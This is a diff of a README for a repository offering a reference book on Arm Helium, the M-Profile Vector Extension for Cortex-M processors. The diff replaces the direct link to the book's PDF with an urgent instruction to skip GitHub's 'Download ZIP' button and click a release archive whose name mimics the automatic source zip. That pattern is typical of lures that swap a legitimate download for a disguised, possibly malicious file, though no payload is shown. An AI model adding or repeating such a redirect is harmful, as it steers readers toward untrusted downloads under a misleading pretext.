@@ -1,13 +1,12 @@
 # Arm-Helium-Technology 
 ## M-Profile Vector Extension (MVE) for Arm Cortex-M Processors
-
-A Reference Book by Jon Marsh
-
-This reference book is the ideal gateway into Arm’s Helium technology, the M-Profile Vector Extension for the Arm Cortex-M processor series.
-
-## [Download here](https://github.com/arm-university/Arm-Helium-Technology/blob/main/HeliumTechnology_referencebook.pdf)
-
+## Important
+### To download the latest stable version, please click below instead of using the "Download ZIP" button.
+### [Click here to download](https://github.com/arm-university/Arm-Helium-Technology/releases/download/v2.0.0/Arm-Helium-Technology-main.zip)
 ## About this Book
+- A Reference Book by Jon Marsh
+- This reference book is the ideal gateway into Arm’s Helium technology, the M-Profile Vector Extension for the Arm Cortex-M processor series.
+
 Helium brings exciting new capabilities to microcontrollers, allowing sophisticated digital signal processing or machine learning applications to be run on inexpensive, low-power devices. In the early chapters, the book introduces fundamental concepts at a very basic and accessible level, including Single Instruction Multiple Data (SIMD), vector processing, floating and fixed-point data representations, and saturation. After an overview of the MVE architecture, the instruction set is broken down into clear groups for discussion, covering subjects like pipeline structure, predication and branch handling, data processing and memory access.
 
 The most practical sections of the book deal with the mechanics of coding for a Helium-capable core such as the Cortex-M55, including compilation, debug and optimization. Finally, the book concludes with chapters on how to implement DSP and ML workloads.
